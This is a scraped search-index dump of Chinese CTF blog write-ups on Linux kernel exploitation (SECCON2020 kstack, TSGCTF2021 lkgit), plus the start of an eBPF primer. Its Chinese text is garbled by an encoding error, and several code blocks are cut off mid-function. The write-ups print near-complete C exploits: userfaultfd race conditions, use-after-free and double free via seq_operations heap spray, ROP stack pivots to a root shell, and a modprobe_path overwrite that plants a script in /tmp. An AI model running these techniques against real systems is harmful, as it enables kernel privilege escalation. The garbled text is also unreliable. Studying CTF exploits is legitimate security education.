","date":"2022-01-17","objectID":"/seccon2020-kstack/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"SECCON2020-kstack","uri":"/seccon2020-kstack/#kstack"},{"categories":["Writeups"],"content":"leakç”±äºkaslræˆ‘ä»¬é¦–å…ˆæ³„æ¼å†…æ ¸åœ°å€ã€‚ç°åœ¨å·²çŸ¥pushå¯ä»¥å†™å†…å­˜ï¼Œè€Œpopå¯ä»¥è¯»å†…å­˜ã€‚é€šè¿‡æ¡ä»¶ç«äº‰é€ æˆä¸ä¸€è‡´æƒ…å†µï¼Œæˆ‘ä»¬å¸Œæœ›åœ¨copy_to_useræ—¶Element-\u003evalueçš„ä½ç½®æœ‰å†…æ ¸åœ°å€ã€‚å‚è€ƒptr-yudaiå¸ˆå‚…çš„åšå®¢ï¼šKernel Exploitã§ä½¿ãˆã‚‹æ§‹é€ ä½“é›†ã€‚è¿™é‡Œæœ‰ä¸¤ä¸ªç»“æ„å¯ä»¥é€‰æ‹©: shm_file_dataå’Œseq_operationsã€‚æˆ‘é€‰æ‹©çš„æ˜¯ç¬¬ä¸€ä¸ªã€‚ é¦–å…ˆåˆ›å»ºä¸€ä¸ªå…±äº«å†…å­˜ï¼Œè¿™æ—¶å†…æ ¸ä¸ºè¿›è¡Œç”³è¯·äº†ä¸€ä¸ªshm_file_dataã€‚ç„¶åï¼Œåˆ é™¤è¿™ä¸ªå…±äº«å†…å­˜ã€‚å†…æ ¸ä¼šå°†shm_file_dataç»™freeæ‰ã€‚æ¥ç€pushï¼Œæ–°å»ºçš„Elementå°±å¯ä»¥å¤ç”¨è¿™å—å†…å­˜ã€‚åœ¨copy_from_userå¤„è§¦å‘ page fault ã€‚æ­¤æ—¶Element-\u003evalueæ²¡æœ‰è¢«ä¿®æ”¹ï¼Œè¿˜ä¿æŒç€åŸæ¥çš„å€¼ã€‚åœ¨ userfaultfd ä¸­ï¼Œpopè¿™ä¸ªå€¼åˆ°æŒ‡å®šçš„ä½ç½®ã€‚è¿™æ ·æˆ‘ä»¬å°±æ³„æ¼äº†åœ°å€ã€‚ ","date":"2022-01-17","objectID":"/seccon2020-kstack/:1:0","series":null,"tags":["Writeups","Kernel"],"title":"SECCON2020-kstack","uri":"/seccon2020-kstack/#leak"},{"categories":["Writeups"],"content":"double freeä½¿ç”¨ç±»ä¼¼çš„æ‰‹æ³•ï¼Œå¯ä»¥å°†åŒä¸€ä¸ªElementç»™popä¸¤æ¬¡ï¼Œè¿™æ ·æˆ‘ä»¬å¾—åˆ°äº†ä¸¤ä¸ªç›¸åŒå¤§å°çš„slabã€‚å…¶ä¸­ä¸€ä¸ªé€šè¿‡open(\"/proc/self/stat\")åˆ†é…ç»™seq_operationsã€‚æ­¤ç»“æ„ä½“ä¸­åŒ…å«å¯¹fdæ“ä½œçš„å„ç§å†…æ ¸å‡½æ•°æŒ‡é’ˆã€‚å¦ä¸€å—é€šè¿‡setxttaråˆ†é…ï¼Œå¯ä»¥ä¿®æ”¹æ•´ä¸ªå†…å­˜ç©ºé—´ï¼ˆsetxttarå¯ä»¥ä¿®æ”¹å¾ˆå¤§çš„å†…å­˜ï¼Œå¯ä»¥ç”¨æ¥å †å–·ï¼‰ï¼Œè¿™é‡Œæˆ‘ä»¬åªè¦ä¿®æ”¹ä½ è¦åŠ«æŒçš„æŒ‡é’ˆå³å¯ï¼Œæˆ‘è¿™é‡Œé€‰æ‹©çš„æ˜¯*nextã€‚ é¢˜ç›®æ²¡æœ‰å¼€å¯smapï¼Œå¯ä»¥é€šè¿‡gadgetè¿›è¡Œstack pivotï¼Œæœ€åROPå®ç°ææƒã€‚ ","date":"2022-01-17","objectID":"/seccon2020-kstack/:2:0","series":null,"tags":["Writeups","Kernel"],"title":"SECCON2020-kstack","uri":"/seccon2020-kstack/#double-free"},{"categories":["Writeups"],"content":"The full exp #define _GNU_SOURCE #include \u003cassert.h\u003e#include \u003cerr.h\u003e#include \u003cerrno.h\u003e#include \u003cfcntl.h\u003e#include \u003clinux/bpf.h\u003e#include \u003clinux/filter.h\u003e#include \u003clinux/userfaultfd.h\u003e#include \u003cmalloc.h\u003e#include \u003cnetinet/in.h\u003e#include \u003cpoll.h\u003e#include \u003cpthread.h\u003e#include \u003csched.h\u003e#include \u003csignal.h\u003e#include \u003cstdint.h\u003e#include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003csys/ioctl.h\u003e#include \u003csys/ipc.h\u003e#include \u003csys/mman.h\u003e#include \u003csys/msg.h\u003e#include \u003csys/prctl.h\u003e#include \u003csys/shm.h\u003e#include \u003csys/socket.h\u003e#include \u003csys/syscall.h\u003e#include \u003csys/types.h\u003e#include \u003csys/uio.h\u003e#include \u003csys/xattr.h\u003e#include \u003cunistd.h\u003e #include \"./src/kstack.h\"#define PAGE_SIZE 4096 void die(const char *msg) { fprintf(stderr, msg, strlen(msg), 0); exit(-1); } int global_fd; int shmid; int fds[0x80]; int sfd; void *target = NULL; uint64_t kernbase; uint64_t modprobe_path; uint64_t user_cs, user_sp, user_ss, user_rflags; void push(uint64_t *value) { if (ioctl(global_fd, CMD_PUSH, value) \u003c 0) { die(\"[!] Failed to push\\n\"); } printf(\"[*] pushed --\u003e 0x%.8lx\\n\", *value); } void pop(uint64_t *value) { if (ioctl(global_fd, CMD_POP, value) \u003c 0) { die(\"[!] Failed to pop\\n\"); } printf(\"[*] poped --\u003e 0x%.8lx\\n\", *value); } void save_state() { __asm__(\".intel_syntax noprefix;\" \"mov user_cs, cs;\" \"mov user_ss, ss;\" \"mov user_sp, rsp;\" \"pushf;\" \"pop user_rflags;\" \".att_syntax;\"); puts(\"[*] Saved state\"); } void pop_shell() { char *argv1[] = {\"/bin/cat\", \"/flag\", NULL}; char *envp1[] = {NULL}; execve(\"/bin/cat\", argv1, envp1); char *envp[] = {NULL}; char *argv[] = {\"/bin/sh\", NULL}; execve(\"/bin/sh\", argv, envp); } static void fault_handler_thread(void *arg) { puts(\"[+] entered fault_handler_thread!\"); static struct uffd_msg msg; static int fault_cnt = 0; struct uffdio_copy uc; uint64_t uffd = (uint64_t)arg; struct pollfd pollfd; int nready; void *value = NULL; pollfd.fd = uffd; pollfd.events = POLLIN; puts(\"[+] polling...\"); while ((nready = poll(\u0026pollfd, 1, -1)) \u003e 0) { if (pollfd.revents \u0026 POLLERR || pollfd.revents \u0026 POLLHUP) { die(\"[!] poll failed\\n\"); } if ((read(uffd, \u0026msg, sizeof(msg))) == 0) { die(\"[!] read uffd msg failed\\n\"); } if (msg.event != UFFD_EVENT_PAGEFAULT) { die(\"[!] unexpected pagefault\\n\"); } if (fault_cnt++ == 0) { value = mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); strcpy(value, \"AAAAAAAA\\x00\"); printf(\"[+] page fault: %p\\n\", (void *)msg.arg.pagefault.address); pop(value); puts(\"[+] heap spray...\"); for (int i = 0; i \u003c 0x80; i++) { fds[i] = open(\"/proc/self/stat\", O_RDONLY); } uc.src = (unsigned long)value; } else { value = mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); strcpy(value, \"AAAAAAAA\\x00\"); printf(\"[+] page fault: %p\\n\", (void *)msg.arg.pagefault.address); pop(value); puts(\"[+] double free\"); uc.src = (unsigned long)value; } uc.len = PAGE_SIZE; uc.dst = (unsigned long)msg.arg.pagefault.address \u0026 ~(PAGE_SIZE - 1); uc.mode = 0; uc.copy = 0; if (ioctl(uffd, UFFDIO_COPY, \u0026uc) == -1) { die(\"[!] ioctl-UFFDIO_COPY\"); } break; } puts(\"[+] exit fault_handler_thread!\"); } void RegisterUserfault(void *fault_page, void *handler) { pthread_t phr; struct uffdio_api ua; struct uffdio_register ur; uint64_t uufd; int s; uufd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); if (uufd \u003c 0) { die(\"[!] Failed to register userfaultfd\\n\"); } ua.api = UFFD_API; ua.features = 0; if (ioctl(uufd, UFFDIO_API, \u0026ua) == -1) { die(\"[!] Failed ioctl UFFDIO_API\\n\"); } ur.range.start = (unsigned long)fault_page; ur.range.len = PAGE_SIZE; ur.mode = UFFDIO_REGISTER_MODE_MISSING; if (ioctl(uufd, UFFDIO_REGISTER, \u0026ur) == -1) { die(\"[!] Failed ioctl UFFDIO_REGISTER\\n\"); } s = pthread_create(\u0026phr, NULL, handler, (void *)uufd); if (s != 0) { die(\"[!] Failed pthread_create\\n\"); } } // create a share memory --\u003e free it --\u003e push --\u003e page fault --\u003e pop --\u003e leaks // void createShareMemory() { if ((shmid = shmget((key_t)0xdead, PAGE_SIZE, 0640 | IPC_CREAT)) == -1) { die(\"[!] Fai","date":"2022-01-17","objectID":"/seccon2020-kstack/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"SECCON2020-kstack","uri":"/seccon2020-kstack/#the-full-exp"},{"categories":["Writeups"],"content":"userfaultfduserfaultfdï¼Œè¿™æ˜¯ kernel ä¸­æä¾›çš„ä¸€ç§ç‰¹æ®Šçš„å¤„ç† page fault çš„æœºåˆ¶ï¼Œèƒ½å¤Ÿè®©ç”¨æˆ·æ€ç¨‹åºè‡ªè¡Œå¤„ç†è‡ªå·±çš„ page fault. å®ƒçš„è°ƒç”¨æ–¹å¼æ˜¯é€šè¿‡ä¸€ä¸ª userfaultfd çš„ syscall æ–°å»ºä¸€ä¸ª fdï¼Œç„¶åç”¨ ioctl ç­‰ syscall æ¥è°ƒç”¨ç›¸å…³çš„API. è¯¥æœºåˆ¶çš„åˆè¡·æ˜¯ä¸ºäº†æ–¹ä¾¿è™šæ‹Ÿæœºçš„ live migrationï¼Œå…¶åŠŸèƒ½è¿˜å¤„åœ¨ä¸æ–­æ”¹è¿›å’Œå‘å±•ä¸­ï¼Œæ–‡æ¡£å’Œèµ„æ–™éƒ½ä¸æ˜¯å¾ˆå¤šã€‚ ","date":"2022-01-17","objectID":"/tsgctf2021-lkgit-userfaultfd/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"TSGCTF2021-lkgit(userfaultfd)","uri":"/tsgctf2021-lkgit-userfaultfd/#userfaultfd"},{"categories":["Writeups"],"content":"å·¥ä½œæµç¨‹å’Œç”¨æ³•","date":"2022-01-17","objectID":"/tsgctf2021-lkgit-userfaultfd/:1:0","series":null,"tags":["Writeups","Kernel"],"title":"TSGCTF2021-lkgit(userfaultfd)","uri":"/tsgctf2021-lkgit-userfaultfd/#å·¥ä½œæµç¨‹å’Œç”¨æ³•"},{"categories":["Writeups"],"content":"åˆ†é…ä¸€ä¸ªuserfault fd å¹¶æ£€æŸ¥ API /* Create and enable userfaultfd object */ uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); if (uffd == -1) errExit(\"userfaultfd\"); uffdio_api.api = UFFD_API; uffdio_api.features = 0; if (ioctl(uffd, UFFDIO_API, \u0026uffdio_api) == -1) errExit(\"ioctl-UFFDIO_API\"); ","date":"2022-01-17","objectID":"/tsgctf2021-lkgit-userfaultfd/:1:1","series":null,"tags":["Writeups","Kernel"],"title":"TSGCTF2021-lkgit(userfaultfd)","uri":"/tsgctf2021-lkgit-userfaultfd/#åˆ†é…ä¸€ä¸ªuserfault-fd-å¹¶æ£€æŸ¥-api"},{"categories":["Writeups"],"content":"æ³¨å†Œéœ€è¦è¿›è¡Œ userfault çš„å†…å­˜åŒºåŸŸ /* Register the memory range of the mapping we just created for handling by the userfaultfd object. In mode, we request to track missing pages (i.e., pages that have not yet been faulted in). */ uffdio_register.range.start = (unsigned long) addr; uffdio_register.range.len = len; uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING; if (ioctl(uffd, UFFDIO_REGISTER, \u0026uffdio_register) == -1) errExit(\"ioctl-UFFDIO_REGISTER\"); ","date":"2022-01-17","objectID":"/tsgctf2021-lkgit-userfaultfd/:1:2","series":null,"tags":["Writeups","Kernel"],"title":"TSGCTF2021-lkgit(userfaultfd)","uri":"/tsgctf2021-lkgit-userfaultfd/#æ³¨å†Œéœ€è¦è¿›è¡Œ-userfault-çš„å†…å­˜åŒºåŸŸ"},{"categories":["Writeups"],"content":"åˆ›å»º monitor çº¿ç¨‹ç›‘å¬ fd çš„äº‹ä»¶ï¼ˆï¼‰åœ¨ä¸€ä¸ª for å¾ªç¯ä¸­ï¼Œä¸æ–­ä½¿ç”¨ pool æ¥ç­‰å¾…è¿™ä¸ª fd ï¼Œç„¶åè¯»å–ä¸€ä¸ª msgï¼Œè¿™é‡Œè¯»å–çš„ msg å°±æ˜¯ uffd_msg ç»“æ„ã€‚ for (;;) { /* See what poll() tells us about the userfaultfd */ struct pollfd pollfd; int nready; pollfd.fd = uffd; pollfd.events = POLLIN; nready = poll(\u0026pollfd, 1, -1); if (nready == -1) errExit(\"poll\"); printf(\"\\nfault_handler_thread():\\n\"); printf(\" poll() returns: nready = %d; \" \"POLLIN = %d; POLLERR = %d\\n\", nready, (pollfd.revents \u0026 POLLIN) != 0, (pollfd.revents \u0026 POLLERR) != 0); /* Read an event from the userfaultfd */ nread = read(uffd, \u0026msg, sizeof(msg)); if (nread == 0) { printf(\"EOF on userfaultfd!\\n\"); exit(EXIT_FAILURE); } if (nread == -1) errExit(\"read\"); ","date":"2022-01-17","objectID":"/tsgctf2021-lkgit-userfaultfd/:1:3","series":null,"tags":["Writeups","Kernel"],"title":"TSGCTF2021-lkgit(userfaultfd)","uri":"/tsgctf2021-lkgit-userfaultfd/#åˆ›å»º-monitor-çº¿ç¨‹ç›‘å¬-fd-çš„äº‹ä»¶"},{"categories":["Writeups"],"content":"ä¸»çº¿ç¨‹å‡ºå‘æŒ‡å®šåŒºåŸŸçš„ page faultè®¿é—®è¯¥åŒºåŸŸçš„å†…å­˜å³å¯ ","date":"2022-01-17","objectID":"/tsgctf2021-lkgit-userfaultfd/:1:4","series":null,"tags":["Writeups","Kernel"],"title":"TSGCTF2021-lkgit(userfaultfd)","uri":"/tsgctf2021-lkgit-userfaultfd/#ä¸»çº¿ç¨‹å‡ºå‘æŒ‡å®šåŒºåŸŸçš„-page-fault"},{"categories":["Writeups"],"content":"è‡ªçº¿ç¨‹å¤„ç† faultè°ƒç”¨ UFFDIO_COPY ä¸ºæ–°æ˜ å°„çš„é¡µæä¾›æ•°æ®ï¼Œå¹¶å”¤é†’ä¸»çº¿ç¨‹ï¼Œå­çº¿ç¨‹è‡ªèº«ä¼šè¿›å…¥åˆ°ä¸‹ä¸€è½®å¾ªç¯ä¸­ç»§ç»­ poll ç­‰å¾…è¾“å…¥ /* Copy the page pointed to by 'page' into the faulting region. Vary the contents that are copied in, so that it is more obvious that each fault is handled separately. */ memset(page, 'A' + fault_cnt % 20, page_size); fault_cnt++; uffdio_copy.src = (unsigned long) page; /* We need to handle page faults in units of pages(!). So, round faulting address down to page boundary */ uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address \u0026 ~(page_size - 1); uffdio_copy.len = page_size; uffdio_copy.mode = 0; uffdio_copy.copy = 0; if (ioctl(uffd, UFFDIO_COPY, \u0026uffdio_copy) == -1) errExit(\"ioctl-UFFDIO_COPY\"); åœ¨å¤„ç†userfaultfdçš„æ—¶ï¼Œè§¦å‘ page fault çš„è¿›ç¨‹è¢«é˜»å¡ï¼Œæ‰§è¡Œæˆ‘ä»¬çš„å¤„ç†ç¨‹åºã€‚è¿™æ ·å¯ä»¥æé«˜æ¡ä»¶ç«äº‰çš„å‡ ç‡ã€‚ ","date":"2022-01-17","objectID":"/tsgctf2021-lkgit-userfaultfd/:1:5","series":null,"tags":["Writeups","Kernel"],"title":"TSGCTF2021-lkgit(userfaultfd)","uri":"/tsgctf2021-lkgit-userfaultfd/#è‡ªçº¿ç¨‹å¤„ç†-fault"},{"categories":["Writeups"],"content":"Challenge: lkgitè¿™æ˜¯ä¸€é“kernel pwnä½¿ç”¨äº†å¾ˆæ ‡å‡†çš„ userfaultfd æ¥ä¸ºæ¡ä»¶ç«äº‰åˆ›é€ æ¡ä»¶ã€‚æ¥è‡ªTSGCTF2021ã€‚å…³äºæ¡ä»¶ç«äº‰è¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ã€‚ å›½å¤–çš„æ¯”èµ›å¤§éƒ½æä¾›äº†æºä»£ç ï¼ˆNiceï¼ï¼‰ lkgitåœ¨linux å†…æ ¸ä¸­æ¨¡ä»¿äº†ä¸€ä¸ªgitã€‚ç”¨æˆ·æäº¤ content å’Œ msgï¼Œå†…æ ¸è¿”å› content çš„å“ˆå¸Œã€‚é€šè¿‡ hash æ¥å®šä½ä¸€ä¸ªå¯¹è±¡ï¼Œè¿›è¡ŒæŸ¥/æ”¹ã€‚å¦‚æœæ–°æäº¤çš„å¯¹è±¡çš„ hash ä¸æ—§çš„ç›¸åŒï¼Œåˆ™æ—§çš„å¯¹è±¡ä¼šè¢«freeã€‚ å®ƒé€šè¿‡ä¸€ä¸ªå…¨å±€å˜é‡æ•°ç»„æ¥ç»´æŠ¤æ‰€æœ‰çš„å¯¹è±¡ï¼Œä½†æ¯ä¸ªå¯¹å…¨å±€å˜é‡çš„æ“ä½œéƒ½æ²¡æœ‰åŠ é”ã€‚è¿™è¡¨æ˜æˆ‘ä»¬å¯ä»¥è¾¾æˆ UAFã€‚ ç”±äºå¼€å¯äº†KASLRï¼Œæ‰€ä»¥éœ€è¦å…ˆæ³„æ¼å†…æ ¸çš„åœ°å€ã€‚åœ¨lkgit_get_objectä¸­æœ‰å››æ¬¡ä¸ç”¨æˆ·æ€æ•°æ®çš„äº¤äº’ã€‚ç¬¬ä¸€æ¬¡ï¼Œç”¨æˆ·req-\u003ehashï¼Œå–å‡ºå¯¹åº”çš„å¯¹è±¡ã€‚å°†conentè¿”å›ç”¨æˆ·req-\u003econtentæ¥ç€æ£€æŸ¥äº†contentä¸hashæ˜¯å¦å¯¹åº”ã€‚ä¹‹åå°†messageå’Œhashè¿”å›ã€‚ static long lkgit_get_object(log_object *req) { long ret = -LKGIT_ERR_OBJECT_NOTFOUND; char hash_other[HASH_SIZE] = {0}; char hash[HASH_SIZE]; int target_ix; hash_object *target; if (copy_from_user(hash, req-\u003ehash, HASH_SIZE)) goto end; if ((target_ix = find_by_hash(hash)) != -1) { target = objects[target_ix]; if (copy_to_user(req-\u003econtent, target-\u003econtent, FILE_MAXSZ)) // 0x40 goto end; // validity check of hash get_hash(target-\u003econtent, hash_other); if (memcmp(hash, hash_other, HASH_SIZE) != 0) goto end; if (copy_to_user(req-\u003emessage, target-\u003emessage, MESSAGE_MAXSZ)) goto end; if (copy_to_user(req-\u003ehash, target-\u003ehash, HASH_SIZE)) goto end; ret = 0; } end: return ret; } æˆ‘ä»¬å¿…é¡»ä¿è¯æ£€æŸ¥hashçš„æ­£ç¡®æ€§ï¼Œæ‰€ä»¥è¦åœ¨copy_to_user(req-\u003emessage)æ—¶ï¼Œå°†è¿™ä¸ªå¯¹è±¡freeã€‚freeä¹‹åè¿™ä¸ªå†…å­˜objectä¸­ä¼šåŒ…å«å†…æ ¸åœ°å€ä¿¡æ¯ï¼Œä»è€Œleak kernbaseã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªæ€è·¯ï¼ˆæ¥è‡ªKileakï¼‰ï¼š request object || || \\/ lkgit_get_object || || \\/ find_by_hash || || \\/ copy_to_user(content) || || \\/ copy_to_user(message) || || (page fault) ||==============================\u003e userfaulthandler (break on read) || || \\/ delete current object || || \\/ heap spray || || ||\u003c============================================ || || \\/ copy_to_user(hash) ä¸€ä¸ªè§¦å‘è„šæœ¬ã€‚ #define _GNU_SOURCE #include \u003cstring.h\u003e#include \u003cstdio.h\u003e#include \u003cfcntl.h\u003e#include \u003cstdint.h\u003e#include \u003cunistd.h\u003e#include \u003cassert.h\u003e#include \u003cstdlib.h\u003e#include \u003csignal.h\u003e#include \u003cpoll.h\u003e#include \u003cpthread.h\u003e#include \u003cerr.h\u003e#include \u003cerrno.h\u003e#include \u003cnetinet/in.h\u003e#include \u003csched.h\u003e#include \u003clinux/bpf.h\u003e#include \u003clinux/filter.h\u003e#include \u003clinux/userfaultfd.h\u003e#include \u003csys/syscall.h\u003e#include \u003csys/ipc.h\u003e#include \u003csys/msg.h\u003e#include \u003csys/prctl.h\u003e#include \u003csys/ioctl.h\u003e#include \u003csys/mman.h\u003e#include \u003csys/types.h\u003e#include \u003csys/xattr.h\u003e#include \u003csys/socket.h\u003e#include \u003csys/uio.h\u003e#include \u003csys/shm.h\u003e#include \u003cmalloc.h\u003e #include \"./src/include/lkgit.h\" #define PAGE_SIZE 4096 void die(const char *msg) { fprintf(stderr,msg,strlen(msg),0); exit(-1); } int global_fd; int fds[0x80]; void *basepage = NULL; uint64_t kernbase = 0; uint64_t modprobe_path = 0; hash_object *req1 = NULL; log_object *req2 = NULL; static void fault_handler_thread(void *arg) { puts(\"[+] entered fault_handler_thread!\"); static struct uffd_msg msg; struct uffdio_copy uc; uint64_t uffd = (uint64_t)arg; struct pollfd pollfd; int nready; pollfd.fd = uffd; pollfd.events = POLLIN; puts(\"[+] polling...\"); while ((nready = poll(\u0026pollfd, 1, -1)) \u003e 0) { if (pollfd.revents \u0026 POLLERR || pollfd.revents \u0026 POLLHUP) { die(\"[!] poll failed\\n\"); } if ((read(uffd, \u0026msg, sizeof(msg))) == 0) { die(\"[!] read uffd msg failed\\n\"); } if (msg.event != UFFD_EVENT_PAGEFAULT) { die(\"[!] unexpected pagefault\\n\"); } printf(\"[+] page fault: %p\\n\", (void *)msg.arg.pagefault.address); puts(\"[+] Now free this object\"); ioctl(global_fd, LKGIT_HASH_OBJECT, req1); puts(\"[+] heap spray...\"); for (int i = 0; i \u003c 0x80; i++) { fds[i] = open(\"/proc/self/stat\", O_RDONLY); } uc.src = (unsigned long)basepage; uc.len = PAGE_SIZE; uc.dst = (unsigned long)msg.arg.pagefault.address \u0026 ~(PAGE_SIZE - 1); uc.mode = 0; uc.copy = 0; if (ioctl(uffd, UFFDIO_COPY, \u0026uc) == -1) { die(\"[!] ioctl-UFFDIO_COPY\"); } break; } puts(\"[+] exit fault_handler_thread!\"); } void RegisterUserfault(void *fault_page,void *handler) { pthread_t phr; struct uffdio_api ua; struct uffdio_register ur; uint64_t uufd; int s; uufd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); if (uufd \u003c 0) { die(\"[!] Failed to register userfaultfd\\n\"); } ua.api = UFFD_API; ua.features = 0; if (ioctl(uufd, UFFDIO_API, \u0026ua) == -1) { die(\"[!] Failed ioctl UFFDIO_API\\n\"); } ur.range.start = (unsigned long) fault_page; ur.rang","date":"2022-01-17","objectID":"/tsgctf2021-lkgit-userfaultfd/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"TSGCTF2021-lkgit(userfaultfd)","uri":"/tsgctf2021-lkgit-userfaultfd/#challenge-lkgit"},{"categories":["Writeups"],"content":"The full exp #define _GNU_SOURCE #include \u003cstring.h\u003e#include \u003cstdio.h\u003e#include \u003cfcntl.h\u003e#include \u003cstdint.h\u003e#include \u003cunistd.h\u003e#include \u003cassert.h\u003e#include \u003cstdlib.h\u003e#include \u003csignal.h\u003e#include \u003cpoll.h\u003e#include \u003cpthread.h\u003e#include \u003cerr.h\u003e#include \u003cerrno.h\u003e#include \u003cnetinet/in.h\u003e#include \u003csched.h\u003e#include \u003clinux/bpf.h\u003e#include \u003clinux/filter.h\u003e#include \u003clinux/userfaultfd.h\u003e#include \u003csys/syscall.h\u003e#include \u003csys/ipc.h\u003e#include \u003csys/msg.h\u003e#include \u003csys/prctl.h\u003e#include \u003csys/ioctl.h\u003e#include \u003csys/mman.h\u003e#include \u003csys/types.h\u003e#include \u003csys/xattr.h\u003e#include \u003csys/socket.h\u003e#include \u003csys/uio.h\u003e#include \u003csys/shm.h\u003e#include \u003cmalloc.h\u003e #include \"./src/include/lkgit.h\" #define PAGE_SIZE 4096 void die(const char *msg) { fprintf(stderr,msg,strlen(msg),0); exit(-1); } int global_fd; int fds[0x80]; void *basepage = NULL; uint64_t kernbase = 0; uint64_t modprobe_path = 0; hash_object *req = NULL; log_object *logobj = NULL; char* hash_to_string(char *hash) { char *hash_str = calloc(HASH_SIZE * 2 + 1, 1); for(int ix = 0; ix != HASH_SIZE; ++ix) { sprintf(hash_str + ix*2, \"%02lx\", (unsigned long)(unsigned char)hash[ix]); } return hash_str; } static void fault_handler_thread(void *arg) { puts(\"[+] entered fault_handler_thread!\"); static struct uffd_msg msg; static int fault_cnt = 0; struct uffdio_copy uc; uint64_t uffd = (uint64_t)arg; struct pollfd pollfd; int nready; pollfd.fd = uffd; pollfd.events = POLLIN; puts(\"[+] polling...\"); while ((nready = poll(\u0026pollfd, 1, -1)) \u003e 0) { if (pollfd.revents \u0026 POLLERR || pollfd.revents \u0026 POLLHUP) { die(\"[!] poll failed\\n\"); } if ((read(uffd, \u0026msg, sizeof(msg))) == 0) { die(\"[!] read uffd msg failed\\n\"); } if (msg.event != UFFD_EVENT_PAGEFAULT) { die(\"[!] unexpected pagefault\\n\"); } printf(\"[+] page fault: %p\\n\", (void *)msg.arg.pagefault.address); if (fault_cnt++ == 0) { // fisrt page fault, we free this object and leak kernel address puts(\"[+] Now free this object\"); ioctl(global_fd, LKGIT_HASH_OBJECT, req); puts(\"[+] heap spray...\"); for (int i = 0; i \u003c 0x80; i++) { fds[i] = open(\"/proc/self/stat\", O_RDONLY); } } else { // second page fault, we free it and allocate a new one. // new object's message will point to the target we are appending. puts(\"[+] Now free this object\"); ioctl(global_fd, LKGIT_HASH_OBJECT, req); puts(\"[+] Allocate new object\"); for (int i = 0; i \u003c MESSAGE_MAXSZ / sizeof(uint64_t); i++) { *((uint64_t *)req-\u003emessage + i) = modprobe_path; } ioctl(global_fd, LKGIT_HASH_OBJECT, req); } // use uffdio_copy to write request's message uc.src = (unsigned long)basepage; uc.len = PAGE_SIZE; uc.dst = (unsigned long)msg.arg.pagefault.address \u0026 ~(PAGE_SIZE - 1); uc.mode = 0; uc.copy = 0; if (ioctl(uffd, UFFDIO_COPY, \u0026uc) == -1) { die(\"[!] ioctl-UFFDIO_COPY\"); } break; } puts(\"[+] exit fault_handler_thread!\"); } void get_flag(void){ puts(\"[*] Setting up for fake modprobe\"); system(\"echo '#!/bin/sh\\nchmod 777 /home/user/flag' \u003e /tmp/niebelungen\"); system(\"chmod +x /tmp/niebelungen\"); system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' \u003e /tmp/dummy\"); system(\"chmod +x /tmp/dummy\"); puts(\"[*] Run unknown file\"); system(\"/tmp/dummy\"); puts(\"[*] Hopefully flag is readable\"); system(\"cat /home/user/flag\"); exit(0); } void RegisterUserfault(void *fault_page,void *handler) { pthread_t phr; struct uffdio_api ua; struct uffdio_register ur; uint64_t uufd; int s; uufd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); if (uufd \u003c 0) { die(\"[!] Failed to register userfaultfd\\n\"); } ua.api = UFFD_API; ua.features = 0; if (ioctl(uufd, UFFDIO_API, \u0026ua) == -1) { die(\"[!] Failed ioctl UFFDIO_API\\n\"); } ur.range.start = (unsigned long) fault_page; ur.range.len = PAGE_SIZE; ur.mode = UFFDIO_REGISTER_MODE_MISSING; if (ioctl(uufd, UFFDIO_REGISTER, \u0026ur) == -1) { die(\"[!] Failed ioctl UFFDIO_REGISTER\\n\"); } s = pthread_create(\u0026phr, NULL, handler, (void *)uufd); if (s != 0) { die(\"[!] Failed pthread_create\\n\"); } } int main() { global_fd = open(\"/dev/lkgit\", O_RDWR); if(global_fd \u003c 0) { die(\"[!] Couldn't open /dev/lkgit\\n\"); } // part 1: UAF ","date":"2022-01-17","objectID":"/tsgctf2021-lkgit-userfaultfd/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"TSGCTF2021-lkgit(userfaultfd)","uri":"/tsgctf2021-lkgit-userfaultfd/#the-full-exp"},{"categories":["Pwning"],"content":"eBPF","date":"2022-01-17","objectID":"/ebpf-basic-learning/:0:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#ebpf"},{"categories":["Pwning"],"content":"What is eBPF ï¼ŸeBPF å…¨ç§°æ˜¯ extended Berkeley Packet Filter ï¼Œèµ·æºäº BPF ( Berkeley Packet Filter )ã€‚é¡¾åæ€ä¹‰ï¼Œå®ƒå‘linuxå†…æ ¸æä¾›äº†å¯¹æ•°æ®åŒ…çš„è¿‡æ»¤ã€‚ æ—©æœŸçš„ç½‘ç»œç›‘æ§å™¨ç­‰éƒ½æ˜¯ä½œä¸ºç”¨æˆ·çº§è¿›ç¨‹è¿è¡Œçš„ã€‚ä¸ºäº†åˆ†æåªåœ¨å†…æ ¸ç©ºé—´è¿è¡Œçš„æ•°æ®ï¼Œå®ƒä»¬å¿…é¡»å°†è¿™äº›æ•°æ®ä»å†…æ ¸ç©ºé—´å¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´çš„å†…å­˜ä¸­å»ï¼Œå¹¶è¿›è¡Œä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚è¿™ä¸ç›´æ¥åœ¨å†…æ ¸ç©ºé—´åˆ†æè¿™äº›æ•°æ®ç›¸æ¯”ï¼Œå¯¼è‡´äº†å·¨å¤§çš„æ€§èƒ½å¼€é”€ã€‚ BPF å°±æ˜¯è§£å†³è¿™ä¸€é—®é¢˜çš„ä¸€ç§åœ¨å†…æ ¸ç©ºé—´æ‰§è¡Œé«˜æ•ˆå®‰å…¨çš„ç¨‹åºçš„æœºåˆ¶ã€‚ BPF 